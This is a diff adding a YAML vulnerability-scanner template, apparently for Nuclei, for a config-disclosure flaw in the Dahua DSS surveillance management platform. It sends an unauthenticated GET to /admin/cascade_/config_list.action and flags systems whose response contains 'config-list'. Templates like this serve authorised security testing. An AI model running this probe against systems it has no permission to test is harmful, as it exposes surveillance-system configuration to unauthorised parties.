@@ -1,0 +1,27 @@
+id: dahua-dss-config_list-disclosure
+info:
+  name: 大华 DSS 综合监控管理平台 config 配置泄露
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/CRlife/Rscan/blob/0edbf44689fbc876294a7d8603639dfe44fabeee/poc/yaml-poc/poc-yaml-%E5%A4%A7%E5%8D%8EDSS-config_list-leak.yaml
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+  tags: dahua,dss,disclosure
+
+http:
+  - raw:
+      - |
+        GET /admin/cascade_/config_list.action HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'config-list')
+        condition: and
